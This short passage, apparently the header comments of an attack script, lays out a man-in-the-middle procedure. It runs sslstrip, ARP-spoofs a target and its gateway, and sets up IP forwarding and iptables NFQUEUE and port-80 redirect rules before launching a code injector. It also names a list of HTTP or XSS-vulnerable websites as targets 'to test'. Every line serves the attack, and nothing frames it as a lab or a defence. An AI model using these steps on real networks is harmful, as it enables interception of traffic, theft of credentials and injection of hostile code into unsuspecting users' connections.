# Main websites to test: http or with xss vulnerabilities -> scratchpads.eu/explore/sites-list

# 1 Execute sslstrip tool
# 2 Execute the ARP spoofing on the main target and gateway
# 3 Execute the iptables tools
	# echo 1 > /proc/sys/net/ipv4/ip_forward
	# iptables -I INPUT -j NFQUEUE --queue-num 0 [0 is set by default, check code]
	# iptables -I OUTPUT -j NFQUEUE --queue-num 0 
	# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
	# iptables --flush to clear the current iptables
# 4 Execute code Injector
